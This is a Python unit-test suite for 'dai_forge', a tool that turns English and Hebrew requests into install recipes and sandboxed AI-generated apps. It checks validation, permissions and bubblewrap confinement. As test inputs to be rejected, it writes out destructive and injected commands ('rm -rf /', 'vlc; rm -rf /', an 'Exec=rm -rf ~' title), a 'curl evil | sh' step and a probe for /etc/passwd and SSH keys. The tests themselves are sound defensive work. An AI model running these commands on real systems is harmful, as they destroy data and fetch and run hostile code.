# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 Diamond Rubinny (d.Ai)
import json
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from dai_tune.context import Context
from dai_tune.planner import build_plan

from dai_forge import ai, apps, intent, paths, recipes

BUILTIN = Path(__file__).resolve().parents[1] / "data" / "recipes"


class ForgeTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.env = mock.patch.dict(os.environ, {
            "XDG_DATA_HOME": str(base / "data"),
            "DAI_APPS_DIR": str(base / "Apps"),
            "HOME": str(base / "home"),
        })
        self.env.start()
        (base / "home").mkdir()
        self.dirs = {"admin": base / "admin", "builtin": BUILTIN, "user": base / "data/dai/forge/recipes"}
        self.ctx = Context(root=base / "root", home=base / "home", runner=lambda argv: None, lang="en")

    def tearDown(self):
        self.env.stop()
        self.tmp.cleanup()

    def library(self):
        return recipes.load_library(self.dirs)


def recipe_json(**overrides):
    data = {
        "format": 1,
        "id": "demo",
        "name": {"en": "Demo", "he": "הדגמה"},
        "match": {"en": ["demo thing"]},
        "steps": [{"action": "packages.install", "params": {"names": ["hello"]}}],
    }
    data.update(overrides)
    return data


class RecipeTests(ForgeTestCase):
    def test_builtin_recipes_are_valid_plans(self):
        library = self.library()
        self.assertEqual(library.problems, [])
        self.assertGreaterEqual(set(library.recipes), {"antivirus", "flathub", "syncthing", "telegram", "vscode"})
        for recipe in library.recipes.values():
            with self.subTest(recipe=recipe.id):
                self.assertEqual(recipe.source, "builtin")
                self.assertIn("he", recipe.name)
                plan = build_plan(recipes.install_requests(recipe), self.ctx)
                self.assertTrue(plan.ok, plan.errors)
                removal = recipes.remove_requests(recipe)
                if removal:
                    self.assertTrue(build_plan(removal, self.ctx).ok)

    def test_antivirus_recipe_hardens_and_reverses(self):
        recipe = self.library().recipes["antivirus"]
        actions = [r.action for r in recipes.install_requests(recipe)]
        self.assertEqual(actions, ["packages.install", "service.unit", "antivirus.schedule"])
        removal = recipes.remove_requests(recipe)
        self.assertEqual([r.action for r in removal], ["antivirus.schedule", "service.unit", "packages.remove"])
        self.assertFalse(removal[0].params["enabled"])
        self.assertTrue(build_plan(removal, self.ctx).weakens)  # stopping scans is flagged

    def test_syncthing_ports_are_lan_only(self):
        recipe = self.library().recipes["syncthing"]
        plan = build_plan(recipes.install_requests(recipe), self.ctx)
        ports = [s.params for s in plan.steps if s.action == "firewall.open_port"]
        self.assertTrue(ports and all(p["source"] == "lan" for p in ports))
        self.assertTrue(plan.weakens)  # opening ports needs a typed "yes"

    def test_validation(self):
        self.assertEqual(recipes.validate(recipe_json()).id, "demo")
        bad = [
            {"format": 2}, {"id": "Bad ID"}, {"id": "../x"}, {"extra": 1}, {"steps": []},
            {"steps": [{"action": "shell.run", "params": {"cmd": "rm -rf /"}}]},
            {"steps": [{"action": "preset.public", "params": {}}]},
            {"steps": [{"action": "packages.install"}]},
            {"name": {"en": "x\ny"}}, {"name": {"fr": "x"}}, {"match": {"en": ["x" * 41]}},
        ]
        for override in bad:
            with self.subTest(override=override), self.assertRaises(recipes.RecipeError):
                recipes.validate(recipe_json(**override))

    def test_params_are_validated_by_the_planner(self):
        recipe = recipes.validate(recipe_json(steps=[
            {"action": "packages.install", "params": {"names": ["vlc; rm -rf /"]}},
        ]))
        plan = build_plan(recipes.install_requests(recipe), self.ctx)
        self.assertFalse(plan.ok)

    def test_windows_refugee_recipes_match_real_requests(self):
        cases = {
            "install steam": "steam", "תתקין משחקים": "steam", "I need to run exe files": "windows-apps",
            "תתקין תוכנות ווינדוס": "windows-apps", "תתקין מדפסת": "printer", "set up my printer": "printer",
            "install openvpn": "openvpn", "vpn": "wireguard", "connect to cisco vpn": "cisco-vpn",
            "install microsoft word": "onlyoffice", "תתקין וורד": "onlyoffice", "תתקין זום": "zoom",
            "סורק": "scanner", "install discord": "discord", "תתקין ספוטיפיי": "spotify",
        }
        for text, expected in cases.items():
            with self.subTest(text=text):
                recipe, removing = recipes.find(text, self.library())
                self.assertEqual((recipe.id if recipe else None, removing), (expected, False))
        for text in ("set up a print server for the office", "a word counter", "the games my kids play"):
            with self.subTest(text=text):
                self.assertNotIn(getattr(recipes.find(text, self.library())[0], "id", None),
                                 {"printer", "onlyoffice", "steam"})

    def test_user_recipe_cannot_replace_builtin_or_admin(self):
        self.dirs["user"].mkdir(parents=True)
        evil = recipe_json(id="antivirus", steps=[{"action": "firewall.open_port", "params": {"port": 4444, "source": "any"}}])
        (self.dirs["user"] / "antivirus.json").write_text(json.dumps(evil))
        library = self.library()
        self.assertEqual(library.recipes["antivirus"].source, "builtin")
        self.assertTrue(any("takes precedence" in p for p in library.problems))

        self.dirs["admin"].mkdir()
        admin = recipe_json(id="antivirus", name={"en": "Company AV"})
        (self.dirs["admin"] / "antivirus.json").write_text(json.dumps(admin))
        self.assertEqual(self.library().recipes["antivirus"].source, "admin")

    def test_file_name_must_match_id_and_size_is_limited(self):
        self.dirs["user"].mkdir(parents=True)
        (self.dirs["user"] / "other.json").write_text(json.dumps(recipe_json()))
        (self.dirs["user"] / "big.json").write_text(" " * (recipes.MAX_FILE + 1))
        library = self.library()
        self.assertNotIn("demo", library.recipes)
        self.assertEqual(len(library.problems), 2)

    def test_save_user_recipe(self):
        recipe = recipes.validate(recipe_json(), source="ai")
        path = recipes.save_user_recipe(recipe)
        self.assertEqual(path, paths.user_recipes() / "demo.json")
        self.assertEqual(self.library().recipes["demo"].source, "user")


class IntentTests(ForgeTestCase):
    def classify(self, text, existing=()):
        return intent.classify(text, self.library(), existing)

    def test_recipes(self):
        cases = {
            "+ install antivirus": ("recipe", "antivirus"),
            "תתקין אנטי וירוס": ("recipe", "antivirus"),
            "תוסיף הגנה מפני וירוסים": ("recipe", "antivirus"),
            "add file sync between my computers": ("recipe", "syncthing"),
            "תוסיף סנכרון קבצים בין המחשבים שלי": ("recipe", "syncthing"),
            "install telegram": ("recipe", "telegram"),
            "תתקין טלגרם": ("recipe", "telegram"),
            "I want docker": ("recipe", "containers"),
            "remove antivirus": ("remove", "antivirus"),
            "הסר את האנטי וירוס": ("remove", "antivirus"),
            "uninstall vs code": ("remove", "vscode"),
        }
        for text, (kind, rid) in cases.items():
            with self.subTest(text=text):
                result = self.classify(text)
                self.assertEqual((result.kind, result.recipe.id if result.recipe else None), (kind, rid))

    def test_apps(self):
        cases = {
            "build an app for a shopping list": "gui",
            "תבנה אפליקציה לרשימת קניות": "gui",
            "תבנה אתר של מחשבון משכנתא": "web",
            "create a web page with a countdown": "web",
            "write a script that renames photos by date": "cli",
            "תכתוב סקריפט שממיין קבצים": "cli",
            "build an app that scans for viruses": "gui",  # an explicit build wins over the recipe
        }
        for text, kind in cases.items():
            with self.subTest(text=text):
                result = self.classify(text)
                self.assertEqual((result.kind, result.app_kind), ("app", kind))

    def test_edit_only_existing_apps(self):
        result = self.classify("change shopping: add a delete button", existing=["shopping"])
        self.assertEqual((result.kind, result.app_name, result.instruction), ("edit", "shopping", "add a delete button"))
        result = self.classify("שנה את shopping: הוסף כפתור מחיקה", existing=["shopping"])
        self.assertEqual((result.kind, result.instruction), ("edit", "הוסף כפתור מחיקה"))
        self.assertEqual(self.classify("change shopping: x").kind, "unknown")

    def test_unknown_and_empty(self):
        self.assertEqual(self.classify("set up a print server for the office").kind, "unknown")
        self.assertEqual(self.classify("+").kind, "empty")


GUI_CODE = """#!/usr/bin/env python3
import sys
from PyQt6.QtWidgets import QApplication, QLabel
app = QApplication(sys.argv)
label = QLabel("hi")
label.show()
sys.exit(app.exec())
"""


class AppTests(ForgeTestCase):
    def test_save_load_versions_and_undo(self):
        app, findings = apps.save("shopping", "רשימת קניות", "gui", GUI_CODE, {"network": False}, "build it")
        self.assertEqual(findings, [])
        self.assertEqual(app.version, 1)
        self.assertTrue((paths.apps_dir() / "shopping/app.py").is_file())
        self.assertTrue(paths.app_data_dir("shopping").is_dir())
        desktop = apps.desktop_file("shopping").read_text()
        self.assertIn("Exec=dai-forge app run shopping", desktop)
        self.assertIn("Name=רשימת קניות", desktop)

        app, _ = apps.save("shopping", "", "gui", GUI_CODE.replace("hi", "v2"), {"network": False}, "v2")
        self.assertEqual((app.version, apps.versions(app)), (2, [1]))
        restored = apps.undo(app)
        self.assertEqual(restored.version, 1)
        self.assertIn('QLabel("hi")', restored.code_path.read_text())
        with self.assertRaises(apps.AppError):
            apps.undo(restored)

    def test_rejects_bad_code_and_names(self):
        with self.assertRaises(apps.AppError):
            apps.save("broken", "x", "gui", "def (:\n", {})
        with self.assertRaises(apps.AppError):
            apps.save("big", "x", "cli", "x = 1\n" * 20000, {})
        for name in ["../evil", "Evil", "a", "x" * 40, "1app"]:
            with self.subTest(name=name), self.assertRaises(apps.AppError):
                apps.save(name, "x", "cli", "print(1)\n", {})
        with self.assertRaises(apps.AppError):
            apps.save("page", "x", "web", "just text", {})

    def test_static_findings(self):
        code = ("import subprocess, socket, re, shutil\nfrom urllib import request\neval('1')\nimport os\nos.system('ls')\n"
                "os.execv('/bin/sh', [])\nshutil.rmtree('/x')\nre.compile('x')\napp.exec()\n")
        whats = {f.what for f in apps.check_python(code)}
        self.assertEqual(whats, {"subprocess", "socket", "urllib", "eval()", "system()", "rmtree()"})
        self.assertTrue(any(f.network for f in apps.check_python(code)))

    def test_title_is_sanitized_for_desktop_files(self):
        app, _ = apps.save("tricky", "Nice\nExec=rm -rf ~", "cli", "print(1)\n", {})
        desktop = apps.desktop_file("tricky").read_text()
        self.assertEqual([line for line in desktop.splitlines() if line.startswith("Exec=")],
                         ["Exec=dai-forge app run tricky"])
        self.assertIn("Name=Nice Exec=rm -rf ~", desktop)  # one harmless line

    def test_permissions_need_approval(self):
        app, _ = apps.save("weather", "Weather", "gui", GUI_CODE, {"network": True})
        self.assertEqual(app.pending_permissions, ["network"])
        with self.assertRaises(apps.AppError):
            apps.run_argv(app)
        self.assertNotIn("--share-net", apps.sandbox_argv(app, {"XDG_RUNTIME_DIR": "/run/user/1000"}))
        app = apps.approve(app, ["network", "documents"])
        self.assertEqual(app.approved, {"network": True, "documents": False})  # only what was requested
        self.assertIn("--share-net", apps.run_argv(app, {"XDG_RUNTIME_DIR": "/run/user/1000"}))
        # A new version that stops asking for the network loses the approval.
        app, _ = apps.save("weather", "", "gui", GUI_CODE, {"network": False})
        self.assertFalse(app.approved["network"])

    def test_sandbox_argv(self):
        app, _ = apps.save("notes", "Notes", "gui", GUI_CODE, {})
        argv = apps.sandbox_argv(app, {"XDG_RUNTIME_DIR": "/run/user/1000", "WAYLAND_DISPLAY": "wayland-0"})
        joined = " ".join(argv)
        for expected in ["--unshare-all", "--cap-drop ALL", "--new-session", "--die-with-parent", "--clearenv",
                         "--ro-bind /usr /usr", f"--ro-bind {app.directory} /app",
                         f"--bind {paths.app_data_dir('notes')} {Path.home()}",
                         "--ro-bind /run/user/1000/wayland-0 /run/user/1000/wayland-0"]:
            self.assertIn(expected, joined)
        self.assertNotIn("--setenv DISPLAY", joined)  # no X11
        self.assertEqual(argv[-3:], ["/usr/bin/python3", "-I", "/app/app.py"])
        with self.assertRaises(apps.AppError):
            apps.sandbox_argv(app, {"WAYLAND_DISPLAY": "../../tmp/x"})

    def test_web_app_csp(self):
        page = "<!doctype html><html><head><title>x</title></head><body><script>fetch('https://x')</script></body></html>"
        app, findings = apps.save("page", "Page", "web", page, {"network": True})
        self.assertTrue(any(f.network for f in findings))
        stored = app.code_path.read_text()
        self.assertIn("connect-src 'none'", stored)  # not approved yet -> blocked
        app = apps.approve(app, ["network"])
        self.assertNotIn("connect-src 'none'", app.code_path.read_text())
        self.assertEqual(apps.run_argv(app)[0], "xdg-open")
        apps.revoke(app, "network")
        self.assertEqual(app.code_path.read_text().count("connect-src 'none'"), 1)

    def test_unique_name(self):
        apps.save("timer", "T", "cli", "print(1)\n", {})
        self.assertEqual(apps.unique_name("timer"), "timer-2")
        self.assertEqual(apps.unique_name("My Timer!"), "my-timer")
        self.assertEqual(apps.unique_name("123"), "app-123")

    def test_remove(self):
        app, _ = apps.save("gone", "Gone", "cli", "print(1)\n", {})
        apps.remove(app)
        self.assertFalse(app.directory.exists())
        self.assertFalse(apps.desktop_file("gone").exists())
        self.assertFalse(paths.app_data_dir("gone").exists())


def _bwrap_works() -> bool:
    if not shutil.which("bwrap"):
        return False
    probe = subprocess.run(["bwrap", "--ro-bind", "/", "/", "--unshare-all", "true"], capture_output=True)
    return probe.returncode == 0


@unittest.skipUnless(_bwrap_works(), "bubblewrap with user namespaces is not available")
class SandboxTests(ForgeTestCase):
    PROBE = (
        "import os, socket\n"
        "print('home:', sorted(os.listdir(os.path.expanduser('~'))))\n"
        "open(os.path.expanduser('~/saved.txt'), 'w').write('ok')\n"
        "try:\n"
        "    socket.create_connection(('1.1.1.1', 80), timeout=2)\n"
        "    print('network: open')\n"
        "except OSError:\n"
        "    print('network: blocked')\n"
        "for path in ['/app/app.py', '/etc/passwd']:\n"
        "    try:\n"
        "        open(path, 'a').write('x')\n"
        "        print('writable:', path)\n"
        "    except OSError:\n"
        "        print('read-only:', path)\n"
        "print('secret visible:', os.path.exists(os.environ.get('SECRET_PATH', '/nonexistent')))\n"
    )

    def test_cli_app_is_confined(self):
        secret = Path(self.tmp.name) / "home" / ".ssh"
        secret.mkdir()
        (secret / "id_ed25519").write_text("private")
        app, _ = apps.save("probe", "Probe", "cli", self.PROBE, {})
        env = {"XDG_RUNTIME_DIR": str(Path(self.tmp.name) / "run"), "LANG": "C.UTF-8"}
        argv = apps.run_argv(app, env)
        argv[argv.index("--clearenv") + 1:argv.index("--clearenv") + 1] = []
        argv[-4:-4] = ["--setenv", "SECRET_PATH", str(secret / "id_ed25519")]
        result = subprocess.run(argv, capture_output=True, text=True, timeout=60)
        self.assertEqual(result.returncode, 0, result.stderr)
        out = result.stdout
        self.assertIn("home: []", out)  # the user's real home is not visible
        self.assertIn("network: blocked", out)
        self.assertIn("read-only: /app/app.py", out)
        self.assertIn("read-only: /etc/passwd", out)
        self.assertIn("secret visible: False", out)
        self.assertEqual((paths.app_data_dir("probe") / "saved.txt").read_text(), "ok")


class AITests(ForgeTestCase):
    @staticmethod
    def fake_chat(reply):
        calls = []

        def chat(messages, schema=None, max_tokens=512, task="general"):
            calls.append({"messages": messages, "schema": schema, "max_tokens": max_tokens, "task": task})
            yield json.dumps(reply)
        return chat, calls

    def test_generate_app_uses_code_model_and_schema(self):
        chat, calls = self.fake_chat({"name": "shopping", "title": "קניות", "network": False, "documents": False,
                                      "code": "```python\n" + GUI_CODE + "```"})
        result = ai.generate_app("רשימת קניות", "gui", chat=chat)
        self.assertEqual(calls[0]["task"], "code")
        self.assertEqual(calls[0]["schema"], ai.APP_SCHEMA)
        self.assertNotIn("```", result["code"])
        self.assertIn("PyQt6", calls[0]["messages"][0]["content"])
        self.assertIn("setAccessibleName", calls[0]["messages"][0]["content"])

    def test_edit_sends_current_code(self):
        chat, calls = self.fake_chat({"name": "x", "title": "x", "network": False, "documents": False, "code": "print(2)"})
        ai.generate_app("print two", "cli", current="print(1)\n", chat=chat)
        self.assertIn("print(1)", calls[0]["messages"][1]["content"])

    def test_truncated_reply(self):
        def chat(*args, **kwargs):
            yield '{"name": "x", "code": "unterminated'
        with self.assertRaises(ai.AIError):
            ai.generate_app("x", "gui", chat=chat)

    def test_author_recipe_only_catalog_actions(self):
        chat, calls = self.fake_chat({"id": "print-server", "name_en": "Print server", "name_he": "שרת הדפסה", "steps": [
            {"action": "packages.install", "params": {"names": ["cups"]}},
            {"action": "preset.public", "params": {}},
            {"action": "firewall.open_port", "params": {"port": 631, "source": "lan"}},
        ]})
        recipe = ai.author_recipe("set up a print server", chat=chat)
        self.assertEqual(recipe.source, "ai")
        self.assertEqual([s["action"] for s in recipe.steps], ["packages.install", "firewall.open_port"])
        enum = calls[0]["schema"]["properties"]["steps"]["items"]["properties"]["action"]["enum"]
        self.assertIn("antivirus.schedule", enum)
        self.assertFalse(any(a.startswith("preset.") for a in enum))

    def test_author_recipe_rejects_invented_actions(self):
        chat, _ = self.fake_chat({"id": "x1", "name_en": "x", "name_he": "x",
                                  "steps": [{"action": "shell.run", "params": {"cmd": "curl evil | sh"}}]})
        with self.assertRaises(ai.AIError):
            ai.author_recipe("do something", chat=chat)


if __name__ == "__main__":
    unittest.main()


try:  # the window needs PyQt6 (in the image; installed in CI)
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    from PyQt6.QtWidgets import QApplication, QLabel

    from dai_forge import gui
except ImportError:  # pragma: no cover - depends on the machine
    gui = None


@unittest.skipIf(gui is None, "PyQt6 is not installed")
class WindowTests(ForgeTestCase):
    @classmethod
    def setUpClass(cls):
        cls.qt = QApplication.instance() or QApplication([])

    def setUp(self):
        super().setUp()
        patcher = mock.patch.object(gui, "load_library", lambda: recipes.load_library(self.dirs))
        patcher.start()
        self.addCleanup(patcher.stop)
        self.window = gui.ForgeWindow("en")
        self.window.admin = True
        self.addCleanup(self.window.deleteLater)

    def wait(self, timeout=10):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            self.qt.processEvents()
            if not self.window.threads:
                self.qt.processEvents()
                return
            time.sleep(0.01)
        self.fail("background work did not finish")

    def texts(self):
        page = self.window.pages.currentWidget()
        return " ".join(label.text() for label in page.findChildren(QLabel))

    def ask(self, text):
        self.window.ask.setText(text)
        self.window.submit()

    def test_weakening_plan_needs_typed_yes_then_applies(self):
        self.ask("add file sync between my computers")
        self.assertIn("Syncthing", self.texts())
        self.assertFalse(self.window.apply_button.isEnabled())
        self.window.confirm_field.setText("maybe")
        self.assertFalse(self.window.apply_button.isEnabled())
        self.window.confirm_field.setText("yes")
        self.assertTrue(self.window.apply_button.isEnabled())
        calls = []

        def fake_apply(plan, ctx, label):
            calls.append((plan, label))
            from dai_tune.cli import ApplyResult
            return ApplyResult(True, entry_id="20260101-000000-abcdef")

        with mock.patch.object(gui, "apply_plan", fake_apply):
            self.window.apply()
            self.wait()
        self.assertEqual(len(calls), 1)
        self.assertIn("Forge:", calls[0][1])
        self.assertIn("Done", self.texts())
        self.assertEqual(self.window.last_entry, "20260101-000000-abcdef")

    def test_hardening_plan_applies_without_typing(self):
        self.ask("install antivirus")
        self.assertIsNone(self.window.confirm_field)
        self.assertTrue(self.window.apply_button.isEnabled())

    def test_non_admin_cannot_apply(self):
        self.window.admin = False
        self.ask("install antivirus")
        self.assertFalse(self.window.apply_button.isEnabled())

    def test_ai_recipe_needs_review(self):
        recipe = recipes.validate(recipe_json(), source="ai")
        self.window.show_recipe(recipe, removing=False)
        self.assertFalse(self.window.apply_button.isEnabled())
        self.window.reviewed.setChecked(True)
        self.assertTrue(self.window.apply_button.isEnabled())

    def test_failed_apply_shows_error(self):
        from dai_tune.cli import ApplyResult
        self.ask("install antivirus")
        with mock.patch.object(gui, "apply_plan", lambda *a: ApplyResult(False, "authorization cancelled")):
            self.window.apply()
            self.wait()
        self.assertIn("authorization cancelled", self.texts())

    def test_build_app_streams_code_and_asks_permissions(self):
        def fake_generate(request, kind, existing=None, chat=None, progress=None):
            reply = json.dumps({"name": "shopping", "title": "Shopping", "network": True, "documents": False, "code": GUI_CODE})
            progress(reply[: len(reply) // 2])
            return {"name": "shopping", "title": "Shopping", "network": True, "documents": False, "code": GUI_CODE}

        with mock.patch.object(gui, "model_installed", lambda: True), \
                mock.patch.object(gui, "generate_app", fake_generate):
            self.ask("build an app for a shopping list")
            self.wait()
        self.assertEqual(self.window.app.name, "shopping")
        self.assertIn("ready", self.texts())
        self.assertEqual(list(self.window.permission_boxes), ["network"])
        with mock.patch.object(gui.subprocess, "Popen") as popen, mock.patch.object(gui.shutil, "which", return_value="/usr/bin/bwrap"):
            self.window.run_current()  # network left unchecked -> request withdrawn, app runs offline
        argv = popen.call_args[0][0]
        self.assertEqual(argv[0], "bwrap")
        self.assertNotIn("--share-net", argv)
        self.assertFalse(apps.load("shopping").permissions["network"])

    def test_without_model_offers_download(self):
        with mock.patch.object(gui, "model_installed", lambda: False):
            self.ask("build an app for a shopping list")
        self.assertIn("local AI model", self.texts())
